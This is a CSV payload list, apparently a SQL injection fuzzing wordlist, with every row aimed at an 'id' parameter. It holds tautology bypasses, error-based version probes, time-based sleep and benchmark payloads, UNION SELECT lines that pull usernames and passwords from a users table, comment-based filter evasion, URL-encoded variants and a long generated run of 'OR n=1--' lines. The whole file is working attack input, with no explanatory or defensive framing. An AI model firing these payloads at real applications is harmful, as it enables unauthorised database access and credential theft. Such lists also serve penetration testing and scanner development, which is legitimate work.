Parameter,Payload
id,' OR '1'='1
id,""" OR ""1""=""1"
id,' OR '1'='1' -- 
id,""" OR ""1""=""1"" -- "
id,') OR ('1'='1
id,""") OR (""1""=""1"
id,') OR '1'='1' -- 
id,""") OR ""1""=""1"" -- "
id,"1' AND 1=CONVERT(int,@@version)--"
id,"1"" AND 1=CONVERT(int,@@version)--"
id,1' AND 1=CAST(version() AS INT)--
id,"1"" AND 1=CAST(version() AS INT)--"
id,1' AND '1'='1
id,"1"" AND ""1""=""1"
id,1' AND '1'='2
id,"1"" AND ""1""=""2"
id,1' OR 'a'='a
id,"1"" OR ""a""=""a"
id,1' AND (SELECT COUNT(*) FROM users) > 0
id,"1"" AND (SELECT COUNT(*) FROM users) > 0"
id,1' OR sleep(5)--
id,"1"" OR sleep(5)--"
id,1' OR pg_sleep(5)--
id,"1"" OR pg_sleep(5)--"
id,"1' OR benchmark(5000000,md5('test'))--"
id,"1"" OR benchmark(5000000,md5(""test""))--"
id,"1' UNION SELECT NULL, NULL--"
id,"1' UNION SELECT username, password FROM users--"
id,"1' UNION SELECT 1, @@version--"
id,"1' UNION SELECT user(), database()--"
id,1' UNION SELECT table_name FROM information_schema.tables--
id,1' OR '1'='1' /* 
id,1' OR '1'='1' # 
id,1' OR '1'='1' -- 
id,1' OR '1'='1' -- -
id,1' OR '1'='1' --+
id,1%27+OR+1%3D1--
id,1%27+OR+%271%27%3D%271%27--+
id,1' /*!50000OR*/ '1'='1
id,"1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--"
id,"1' /*!50000UNION*/ /*!50000SELECT*/ username,password FROM users--"
id,"1' OR ASCII(SUBSTRING((SELECT database()),1,1))=100"
id,"1' AND 1=2 UNION SELECT 1,2,version()--"
id,1' OR 0=1--
id,1' OR 1=1--
id,1' OR 2=1--
id,1' OR 3=1--
id,1' OR 4=1--
id,1' OR 5=1--
id,1' OR 6=1--
id,1' OR 7=1--
id,1' OR 8=1--
id,1' OR 9=1--
id,1' OR 10=1--
id,1' OR 11=1--
id,1' OR 12=1--
id,1' OR 13=1--
id,1' OR 14=1--
id,1' OR 15=1--
id,1' OR 16=1--
id,1' OR 17=1--
id,1' OR 18=1--
id,1' OR 19=1--
id,1' OR 20=1--
id,1' OR 21=1--
id,1' OR 22=1--
id,1' OR 23=1--
id,1' OR 24=1--
id,1' OR 25=1--
id,1' OR 26=1--
id,1' OR 27=1--
id,1' OR 28=1--
id,1' OR 29=1--
id,1' OR 30=1--
id,1' OR 31=1--
id,1' OR 32=1--
id,1' OR 33=1--
id,1' OR 34=1--
id,1' OR 35=1--
id,1' OR 36=1--
id,1' OR 37=1--
id,1' OR 38=1--
id,1' OR 39=1--
id,1' OR 40=1--
id,1' OR 41=1--
id,1' OR 42=1--
id,1' OR 43=1--
id,1' OR 44=1--
id,1' OR 45=1--
id,1' OR 46=1--
